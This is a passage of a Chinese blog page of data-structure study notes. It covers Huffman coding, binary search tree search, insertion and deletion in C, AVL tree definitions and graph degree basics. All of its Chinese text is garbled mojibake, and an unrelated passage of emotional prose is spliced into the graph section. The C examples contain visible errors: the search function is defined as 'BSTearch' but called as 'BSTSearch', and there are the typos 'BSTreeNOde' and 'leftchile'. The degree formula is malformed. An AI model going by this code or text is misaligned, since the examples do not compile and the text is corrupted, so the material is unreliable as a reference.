class="comment">//çˆ¶ç»“ç‚¹çš„å³å­©å­ä¸ºx2</span></span><br><span class="line">    &#125;</span><br><span class="line">    pht-&gt;root = <span class="number">2</span>*n<span class="number">-2</span>;<span class="comment">//å“ˆå¤«æ›¼æ ‘æ ¹ç»“ç‚¹ä½ç½®</span></span><br><span class="line">    pht-&gt;n = n;</span><br><span class="line">    <span class="keyword">return</span> pht;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å“ˆå¤«æ›¼ç¼–ç ï¼ˆæœ€ä¼˜å‰ç¼€ç¼–ç ï¼‰"><a href="#å“ˆå¤«æ›¼ç¼–ç ï¼ˆæœ€ä¼˜å‰ç¼€ç¼–ç ï¼‰" class="headerlink" title="å“ˆå¤«æ›¼ç¼–ç ï¼ˆæœ€ä¼˜å‰ç¼€ç¼–ç ï¼‰"></a>å“ˆå¤«æ›¼ç¼–ç ï¼ˆæœ€ä¼˜å‰ç¼€ç¼–ç ï¼‰</h3><ul><li>ç¼–ç é•¿åº¦æœ€çŸ­</li><li>å­—ç¬¦é›†ä¸­ä»»ä¸€å­—ç¬¦çš„ç¼–ç éƒ½<code>ä¸æ˜¯</code>å…¶ä»–å­—ç¬¦çš„ç¼–ç çš„<code>å‰ç¼€</code></li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201215233402.png"></p><h1 id="ç¬¬å››ç« -æœç´¢æ ‘"><a href="#ç¬¬å››ç« -æœç´¢æ ‘" class="headerlink" title="ç¬¬å››ç«  æœç´¢æ ‘"></a>ç¬¬å››ç«  æœç´¢æ ‘</h1><h2 id="äºŒåˆ†åˆ¤å®šæŸ¥æ‰¾æ ‘"><a href="#äºŒåˆ†åˆ¤å®šæŸ¥æ‰¾æ ‘" class="headerlink" title="äºŒåˆ†åˆ¤å®šæŸ¥æ‰¾æ ‘"></a>äºŒåˆ†åˆ¤å®šæŸ¥æ‰¾æ ‘</h2><ul><li>å¹³å‡æ£€ç´¢é•¿åº¦ï¼šASL</li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201216004321.png"></p><ul><li>äºŒåˆ†æŸ¥æ‰¾åˆ¤å®šæ ‘</li></ul><p><code>æŸ¥æ‰¾æˆåŠŸ</code>ï¼šæŸ¥æ‰¾äºŒåˆ†æŸ¥æ‰¾åˆ¤å®šæ ‘ä¸­å·²æœ‰çš„ç»“ç‚¹ï¼Œè·¯å¾„ä¸ºæ ¹ç»“ç‚¹â€”â€”&gt;è¯¥ç»“ç‚¹ï¼Œç»è¿‡ç»“ç‚¹ä¸ªæ•°ä¸ºæ¯”è¾ƒæ¬¡æ•°</p><p><code>æŸ¥æ‰¾å¤±è´¥</code>ï¼šèµ°çš„æ˜¯ä¸€æ¡æ ¹ç»“ç‚¹â€”â€”&gt;æ‰©å……äºŒå‰æ ‘çš„å¤–éƒ¨ç»“ç‚¹çš„è·¯å¾„</p><h2 id="äºŒåˆ†æ’åºæ ‘ï¼ˆBSTï¼‰çš„åŸºæœ¬æ¦‚å¿µ"><a href="#äºŒåˆ†æ’åºæ ‘ï¼ˆBSTï¼‰çš„åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="äºŒåˆ†æ’åºæ ‘ï¼ˆBSTï¼‰çš„åŸºæœ¬æ¦‚å¿µ"></a>äºŒåˆ†æ’åºæ ‘ï¼ˆBSTï¼‰çš„åŸºæœ¬æ¦‚å¿µ</h2><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201216012844.png"></p><ul><li>&#x3D;&#x3D;å¯¹ç§°éå†æœ‰åºæ€§&#x3D;&#x3D;</li><li>&#x3D;&#x3D;äºŒåˆ†æŸ¥æ‰¾æ–¹ä¾¿&#x3D;&#x3D;</li><li>&#x3D;&#x3D;æ’å…¥çš„éƒ½æ˜¯å¶å­ç»“ç‚¹&#x3D;&#x3D;</li><li>&#x3D;&#x3D;åˆ é™¤ä¸éœ€è¦ç§»åŠ¨ç»“ç‚¹&#x3D;&#x3D;</li></ul><h2 id="äºŒåˆ†æ’åºæ ‘çš„æŸ¥æ‰¾"><a href="#äºŒåˆ†æ’åºæ ‘çš„æŸ¥æ‰¾" class="headerlink" title="äºŒåˆ†æ’åºæ ‘çš„æŸ¥æ‰¾"></a>äºŒåˆ†æ’åºæ ‘çš„æŸ¥æ‰¾</h2><ul><li>è¿”å›NULLæŸ¥æ‰¾æˆåŠŸï¼Œå¦åˆ™æŸ¥æ‰¾å¤±è´¥</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">BSTreeNode <span class="title function_">BSTearch</span><span class="params">(BinSearTree bt,DataType key)</span></span><br><span class="line">&#123;</span><br><span class="line">    BSTreeNode p,parent;</span><br><span class="line">    p = bt;</span><br><span class="line">    parent = p;<span class="comment">//è®°å½•å¾…æ’å…¥ç»“ç‚¹çš„çˆ¶ç»“ç‚¹</span></span><br><span class="line">    <span class="keyword">while</span>(p)</span><br><span class="line">    &#123;</span><br><span class="line">        parent = p;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;data == key)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;exist this key\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;data &gt; key)</span><br><span class="line">            p = p-&gt;leftchild;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            p = p-&gt;rightchild;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> parent;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="äºŒåˆ†æ’åºæ ‘çš„æ’å…¥"><a href="#äºŒåˆ†æ’åºæ ‘çš„æ’å…¥" class="headerlink" title="äºŒåˆ†æ’åºæ ‘çš„æ’å…¥"></a>äºŒåˆ†æ’åºæ ‘çš„æ’å…¥</h2><ul><li>å…ˆæŸ¥è¯¢ï¼Œå»ºç«‹æ–°ç»“ç‚¹ï¼Œåˆ¤æ–­åŸäºŒå‰æ’åºæ ‘æ˜¯å¦ä¸ºç©ºï¼Œä¸ºç©ºåˆ™ä¸ºæ ¹ç»“ç‚¹ï¼Œå¦åˆ™è¿›å…¥åˆ¤æ–­ï¼Œæ–°ç»“ç‚¹å¤§äºçˆ¶ç»“ç‚¹æ’å…¥å³å­æ ‘ï¼Œæ–°ç»“ç‚¹å°äºçˆ¶ç»“ç‚¹æ’å…¥å·¦å­æ ‘</li><li>æ’å…¥æˆåŠŸè¿”å›1ï¼Œå¤±è´¥è¿”å›0</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">BSTInsert</span><span class="params">(BinSearTree bt,DataType key)</span></span><br><span class="line">&#123;</span><br><span class="line">    BSTreeNode p,temp;</span><br><span class="line">    temp = BSTSearch(bt,key);<span class="comment">//è°ƒç”¨æŸ¥æ‰¾ç®—æ³•ï¼Œåœ¨ä¸Šé¢</span></span><br><span class="line">    <span class="keyword">if</span>(temp == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;exist this key\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    p = (BSTreeNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> BinSearTreeNode));<span class="comment">//ç”³è¯·ç»“ç‚¹</span></span><br><span class="line">    <span class="keyword">if</span>(p == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;malloc å¤±è´¥\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    p-&gt;data = key;</span><br><span class="line">    p-&gt;leftchild = p-&gt;rightchild = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span>(key &lt; temp-&gt;data)</span><br><span class="line">        temp-&gt;leftchild = p;<span class="comment">//ä½œä¸ºå·¦å­©å­æ’å…¥</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        temp-&gt;rightchild = p;<span class="comment">//ä½œä¸ºå³å­©å­æ’å…¥</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="äºŒåˆ†æ’åºæ ‘çš„åˆ é™¤"><a href="#äºŒåˆ†æ’åºæ ‘çš„åˆ é™¤" class="headerlink" title="äºŒåˆ†æ’åºæ ‘çš„åˆ é™¤"></a>äºŒåˆ†æ’åºæ ‘çš„åˆ é™¤</h2><ul><li><p>å¦‚æœå¾…åˆ é™¤ç»“ç‚¹ p çš„å·¦å­æ ‘ä¸ºç©ºï¼Œåˆ™åªè¦ä»¤å³å­æ ‘çš„æ ¹ç»“ç‚¹ç›´æ¥ä»£æ›¿ p å³å¯</p></li><li><p>å¦‚æœå¾…åˆ é™¤ç»“ç‚¹ p çš„å·¦å­æ ‘ä¸ä¸ºç©º</p></li><li><ul><li><p>æ–¹æ³•ä¸€ï¼š</p></li><li><p>éœ€è¦éå† p çš„å·¦å­æ ‘ï¼Œæ‰¾åˆ°æœ€å¤§çš„ç»“ç‚¹ maxpl ï¼Œåˆ é™¤ maxplï¼Œå†ç”¨ maxpl ä»£æ›¿ p åŸæ¥çš„ä½ç½®</p></li><li><ul><li>å¦‚æœ maxpl æœ‰å·¦åˆ†æ”¯ï¼Œç”¨å…¶å·¦åˆ†æ”¯ä»£æ›¿åŸæ¥ maxpl çš„ä½ç½®ï¼Œ maxpl ä¾æ—§å»ä»£æ›¿ p ç»“ç‚¹çš„ä½ç½®</li></ul></li></ul></li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201216015910.png"></p><ul><li>åˆ é™¤ç®—æ³•ï¼š</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">BSTDelete1</span><span class="params">(BinSearTree *bt,DataType key)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// parent è®°å½• p çš„çˆ¶ç»“ç‚¹ï¼Œmaxpl è®°å½• p çš„å·¦å­æ ‘ä¸­æœ€å¤§çš„ç»“ç‚¹</span></span><br><span class="line">    BSTreeNode parent ,p,maxpl;</span><br><span class="line">    p = *bt;</span><br><span class="line">    parent = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span>(p!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;data == key)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        parent = p;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;data &gt; key)</span><br><span class="line">            p = p-&gt;leftchild;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            p = p-&gt;rightchild;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;not exist\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;leftchild == <span class="literal">NULL</span>)<span class="comment">//åªæœ‰å³å­æ ‘çš„æƒ…å†µ</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(parent == <span class="literal">NULL</span>)<span class="comment">//åˆ¤æ–­æ˜¯ä¸æ˜¯åˆ äº†æ ¹ç»“ç‚¹</span></span><br><span class="line">            *bt = p-&gt;rightchild;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(parent-&gt;leftchild == p)<span class="comment">//å¦‚æœpæ˜¯çˆ¶ç»“ç‚¹çš„å·¦å­©å­</span></span><br><span class="line">            parent-&gt;leftchild = p-&gt;rightchild;</span><br><span class="line">        <span class="keyword">else</span><span class="comment">//å¦‚æœpæ˜¯çˆ¶ç»“ç‚¹çš„å³å­©å­</span></span><br><span class="line">            parent-&gt;rightchild = p-&gt;rightchild;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;leftchild!=<span class="literal">NULL</span>)<span class="comment">//pæœ‰å·¦å­æ ‘å’Œå³å­æ ‘</span></span><br><span class="line">    &#123;</span><br><span class="line">        BSTreeNOde parentp;<span class="comment">//parentpè®°å½•maxplçš„çˆ¶ç»“ç‚¹</span></span><br><span class="line">        parentp = p;</span><br><span class="line">        maxpl = p-&gt;leftchild;</span><br><span class="line">        <span class="keyword">while</span>(maxpl-&gt;rightchild != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            parentp = maxpl;</span><br><span class="line">            maxpl = maxpl-&gt;rightchild;</span><br><span class="line">        &#125;</span><br><span class="line">        p-&gt;data = maxpl-&gt;data;<span class="comment">//ä¿®æ”¹ p çš„æ•°æ®åŸŸä¸º maxpl çš„æ•°æ®åŸŸ</span></span><br><span class="line">        <span class="keyword">if</span>(parentp == p)<span class="comment">//å¦‚æœmaxplçˆ¶ç»“ç‚¹æ˜¯p</span></span><br><span class="line">            p-&gt;leftchile = maxpl-&gt;leftchild;<span class="comment">//ä¿®æ”¹pçš„å·¦æŒ‡é’ˆï¼Œç½®ç©º</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            parentp-&gt;rightchild = maxpl-&gt;leftchild;<span class="comment">//ä¿®æ”¹çˆ¶ç»“ç‚¹çš„å·¦æŒ‡é’ˆï¼Œç½®ç©º</span></span><br><span class="line">        p = maxpl;<span class="comment">//æ›´æ–° p æŒ‡é’ˆä¸º maxpl ç»“ç‚¹ä»¥ä¾¿åˆ é™¤</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><ul><li>æ–¹æ³•äºŒï¼š</li><li>ç›´æ¥è®© p çš„å·¦å­æ ‘æ ¹ç»“ç‚¹ä»£æ›¿ p ï¼Œp çš„ å³å­æ ‘æ¥åˆ° maxpl çš„å³å­æ ‘</li></ul></li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201216023303.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">BSTDelete2</span><span class="params">(BinSearTree *bt,DataType key)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// parent è®°å½• p çš„çˆ¶ç»“ç‚¹ï¼Œmaxpl è®°å½• p çš„å·¦å­æ ‘ä¸­æœ€å¤§çš„ç»“ç‚¹</span></span><br><span class="line">    BSTreeNode parent ,p,maxpl;</span><br><span class="line">    p = *bt;</span><br><span class="line">    parent = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span>(p!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;data == key)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        parent = p;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;data &gt; key)</span><br><span class="line">            p = p-&gt;leftchild;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            p = p-&gt;rightchild;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;not exist\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;leftchild == <span class="literal">NULL</span>)<span class="comment">//åªæœ‰å³å­æ ‘çš„æƒ…å†µ</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(parent == <span class="literal">NULL</span>)<span class="comment">//åˆ¤æ–­æ˜¯ä¸æ˜¯åˆ äº†æ ¹ç»“ç‚¹</span></span><br><span class="line">            *bt = p-&gt;rightchild;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(parent-&gt;leftchild == p)<span class="comment">//å¦‚æœpæ˜¯çˆ¶ç»“ç‚¹çš„å·¦å­©å­</span></span><br><span class="line">            parent-&gt;leftchild = p-&gt;rightchild;</span><br><span class="line">        <span class="keyword">else</span><span class="comment">//å¦‚æœpæ˜¯çˆ¶ç»“ç‚¹çš„å³å­©å­</span></span><br><span class="line">            parent-&gt;rightchild = p-&gt;rightchild;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;leftchild!=<span class="literal">NULL</span>)<span class="comment">//pæœ‰å·¦å­æ ‘å’Œå³å­æ ‘</span></span><br><span class="line">    &#123;</span><br><span class="line">        maxpl = p-&gt;leftchild;</span><br><span class="line">        <span class="keyword">while</span>(maxpl-&gt;rightchild!=<span class="literal">NULL</span>)</span><br><span class="line">            maxpl = maxpl-&gt;rightchild;</span><br><span class="line">        maxpl-&gt;rightchild = p-&gt;rightchild;<span class="comment">//æŠŠpçš„å³åˆ†æ”¯å…¨éƒ¨æ¥åˆ° maxpl çš„å³åˆ†æ”¯ï¼Œå› ä¸ºéƒ½æ¯” maxpl å¤§</span></span><br><span class="line">        <span class="keyword">if</span>(parent == <span class="literal">NULL</span>)<span class="comment">//åˆ¤æ–­æ˜¯ä¸æ˜¯åˆ äº†æ ¹ç»“ç‚¹</span></span><br><span class="line">            *bt = p-&gt;leftchild;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(parent-&gt;leftchild == p)<span class="comment">//å¦‚æœpæ˜¯çˆ¶ç»“ç‚¹çš„å·¦å­©å­</span></span><br><span class="line">            parent-&gt;leftchild = p-&gt;leftchild;</span><br><span class="line">        <span class="keyword">else</span><span class="comment">//å¦‚æœpæ˜¯çˆ¶ç»“ç‚¹çš„å³å­©å­</span></span><br><span class="line">            parent-&gt;rightchild = p-&gt;leftchild;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å¹³è¡¡äºŒå‰æ’åºæ ‘ï¼ˆAVLï¼‰çš„æ¦‚å¿µ"><a href="#å¹³è¡¡äºŒå‰æ’åºæ ‘ï¼ˆAVLï¼‰çš„æ¦‚å¿µ" class="headerlink" title="å¹³è¡¡äºŒå‰æ’åºæ ‘ï¼ˆAVLï¼‰çš„æ¦‚å¿µ"></a>å¹³è¡¡äºŒå‰æ’åºæ ‘ï¼ˆAVLï¼‰çš„æ¦‚å¿µ</h2><ul><li>å¯ä»¥æ˜¯ç©ºæ ‘</li><li>&#x3D;&#x3D;å·¦å³å­æ ‘å‡ä¸ºå¹³è¡¡äºŒå‰æ’åºæ ‘ï¼Œä¸”å·¦å³å­æ ‘æ·±åº¦ä¹‹å·®ç»å¯¹å€¼ä¸è¶…è¿‡1&#x3D;&#x3D;</li><li>ç»“ç‚¹çš„&#x3D;&#x3D;å¹³è¡¡å› å­BFï¼šç»“ç‚¹çš„å·¦å­æ ‘æ·±åº¦ - å³å­æ ‘æ·±åº¦&#x3D;&#x3D;</li></ul><h3 id="AVLæ ‘"><a href="#AVLæ ‘" class="headerlink" title="AVLæ ‘"></a>AVLæ ‘</h3><ul><li>&#x3D;&#x3D;å¹³è¡¡å› å­BFåªèƒ½æ˜¯ -1ï¼Œ0ï¼Œ1 çš„äºŒå‰æ ‘&#x3D;&#x3D;</li></ul><h2 id="AVLæ ‘çš„å››ç§è°ƒæ•´"><a href="#AVLæ ‘çš„å››ç§è°ƒæ•´" class="headerlink" title="AVLæ ‘çš„å››ç§è°ƒæ•´"></a>AVLæ ‘çš„å››ç§è°ƒæ•´</h2><blockquote><p>ä»¥åæœ‰ç©ºè¡¥ä¸Š</p></blockquote><h1 id="ç¬¬äº”ç« -å›¾"><a href="#ç¬¬äº”ç« -å›¾" class="headerlink" title="ç¬¬äº”ç«  å›¾"></a>ç¬¬äº”ç«  å›¾</h1><h2 id="å›¾çš„åŸºæœ¬æ¦‚å¿µ"><a href="#å›¾çš„åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="å›¾çš„åŸºæœ¬æ¦‚å¿µ"></a>å›¾çš„åŸºæœ¬æ¦‚å¿µ</h2><ul><li><p>åº¦ï¼šæ— å‘å›¾ä¸­é¡¶ç‚¹ v çš„åº¦æ˜¯å…³è”ä¸è¯¥é¡¶ç‚¹çš„è¾¹çš„æ•°ç›®ï¼Œè®°ä¸º D(v)</p></li><li><p>å…¥åº¦ï¼šæœ‰å‘å›¾ä¸­ä»¥é¡¶ç‚¹ v ä¸ºç»ˆç‚¹çš„è¾¹çš„æ•°ç›®ç§°ä¸º v çš„å…¥åº¦ï¼Œè®°ä¸º ID(v)</p></li><li><p>å‡ºåº¦ï¼šæœ‰å‘å›¾ä¸­ä»¥é¡¶ç‚¹ v ä¸ºå§‹ç‚¹çš„è¾¹çš„æ•°ç›®ç§°ä¸º v çš„å‡ºåº¦ï¼Œè®°ä¸º OD(v)</p></li><li><p>&#x3D;&#x3D;æœ‰å‘å›¾ä¸­é¡¶ç‚¹ v çš„åº¦å®šä¹‰ä¸ºè¯¥é¡¶ç‚¹çš„å…¥åº¦å’Œå‡ºåº¦ä¹‹å’Œ&#x3D;&#x3D;</p></li><li><p>&#x3D;&#x3D;æ— è®ºæ˜¯æœ‰å‘å›¾è¿˜æ˜¯æ— å‘å›¾ï¼Œé¡¶ç‚¹æ•° n å’Œè¾¹æ•° e å’Œåº¦æ•°ä¹‹é—´çš„å…³ç³»ä¸º&#x3D;&#x3D;</p></li></ul><p>â€‹                                                                                     $\displaystyle \sum^{n}_{i \to 1}{D(v_i) &#x2F; 2}$</p><p>ä½ å¼€å§‹å°å¿ƒç¿¼ç¿¼çš„é¿å¼€æˆ‘ï¼Œåƒæäº†æ›¾ç»çš„è‡ªå·±ï¼Œè€Œæˆ‘èƒ½åšçš„åªæ˜¯è¿œè¿œçš„æœ›ç€ä½ ï¼Œå…¶å®æˆ‘ä¹Ÿå¾ˆæƒ³ä¸»åŠ¨é è¿‘ä½ ï¼Œä½†æœ€åè¿˜æ˜¯æŠŠè€å¿ƒéƒ½ç»™äº†ä½ ï¼Œæ—¶é—´è¿‡äº†å¾ˆä¹…ä½ è¿˜æ˜¯ä¸ä¸ºæ‰€åŠ¨ï¼Œå¥½åƒæ ¹æœ¬å°±æ²¡æœ‰æ„è¯†åˆ°æˆ‘çš„å­˜åœ¨ï¼Œæˆ‘å¼€å§‹æœ‰äº›å¤±è½ï¼Œæƒ³ç€æ˜¯å¦èƒ½å¤Ÿç¦»ä½ è¿‘ä¸€ç‚¹ï¼Œå¯ä½ é‚£è¿‡åˆ†çš„æ•æ„Ÿï¼Œè®©æˆ‘æ„£åœ¨åŸåœ°æœ‰äº›ä¸çŸ¥æ‰€æªï¼Œè„‘æµ·é‡Œå‡ºç°è¿‡å¾ˆå¤šä¸åŒçš„åœºæ™¯ï¼Œå¯èƒ½æ˜¯å‹æŠ‘äº†å¤ªä¹…ï¼Œæˆ‘è§‰å¾—è‡ªå·±å·²ç»å¾ˆå‘å¾®äº†ï¼Œä½†å¯¹äºä½ æ¥è¯´ï¼Œä¸çŸ¥é“è¿™æ˜¯é”™è¿‡è¿˜æ˜¯è§£è„±ã€‚ä½†å…¶å®è¯´æ¥ä¹Ÿå¥½ç¬‘ï¼Œè‡ªå·±åˆä½•å°ä¸æ˜¯å’Œä½ ä¸€æ ·å‘¢ã€‚ä½ è¿˜æ˜¯ä¸è‚¯é¢å¯¹æˆ‘ï¼Œå³ä½¿ä½ å·²ç»èµ°åˆ°äº†æˆ‘çš„é¢å‰ï¼Œä½ çœŸçš„å·²ç»ç¼ºå¸­äº†å¤ªå¤šæˆ‘éœ€è¦ä½ çš„æ—¶åˆ»ï¼Œä½ æ›¾ç»é‚£æ¨¡ç³Šçš„å¥½æ„Ÿï¼Œè®©æˆ‘å¿ƒåŠ¨å¾ˆä¹…ï¼Œå¯ç°åœ¨ï¼Œæˆ‘å·²ç»æ²¡æœ‰å†ç­‰ä¸‹å»çš„å‹‡æ°”äº†ï¼Œæˆ‘çš„å¿ƒï¼Œå·²ç»å¼€å§‹ä¹±äº†ã€‚ä¸ç”˜å¿ƒäºèˆä¸å¾—ï¼Œåªä¼šè®©æˆ‘ä»¬çš„è·ç¦»è¶Šæ¥è¶Šå¤§ï¼ŒåŸæ¥æˆ‘å§‹ç»ˆéƒ½æ˜¯ä¸ªå±€å¤–äººï¼Œè¿™ç»µå»¶çš„åŸå¸‚åº”æœ‰å°½æœ‰ï¼Œå´å”¯ç‹¬æ²¡æœ‰ä½ ï¼Œä¹Ÿæ²¡æœ‰å°½å¤´ï¼Œåªæœ‰æˆ‘çš„å­˜åœ¨ï¼Œå§‹ç»ˆéƒ½æ˜¯è¿å’Œçš„ï¼Œæœ‰äº›äº‹åˆ°æ­¤ä¸ºæ­¢ï¼Œå°±æ˜¯æœ€å¥½çš„æ”¶åœºï¼Œä¸æ˜¯æƒ³é€šäº†ï¼Œæ˜¯ç®—äº†ï¼Œå°±è¿ä½ å”¯ä¸€ä¸€æ¬¡æœç€æˆ‘èµ°æ¥ï¼Œä¹Ÿåªä¸è¿‡æ˜¯ç»™äº†æˆ‘ä¸€åœºç©ºæ¬¢å–œï¼Œè‹¥ä¸æ˜¯å¤±æœ›åˆ°æè‡´ï¼Œåˆæ€ä¼šï¼Œä¸¤çœ¼æ— æ‚²å–œï¼Œä½ ç»™æˆ‘çš„é—æ†¾è™½ç„¶å¾ˆå¤šå¾ˆå¤šï¼Œä½†æœ€åç¦»å¼€çš„ä½ ï¼Œä¹Ÿé™ªæˆ‘åº¦è¿‡äº†å¾ˆä¹…å¾ˆä¹…</p><h2 id="å›¾çš„å­˜å‚¨è¡¨ç¤º"><a href="#å›¾çš„å­˜å‚¨è¡¨ç¤º" class="headerlink" title="å›¾çš„å­˜å‚¨è¡¨ç¤º"></a>å›¾çš„å­˜å‚¨è¡¨ç¤º</h2><h3 id="é‚»æ¥çŸ©é˜µè¡¨ç¤ºæ³•"><a 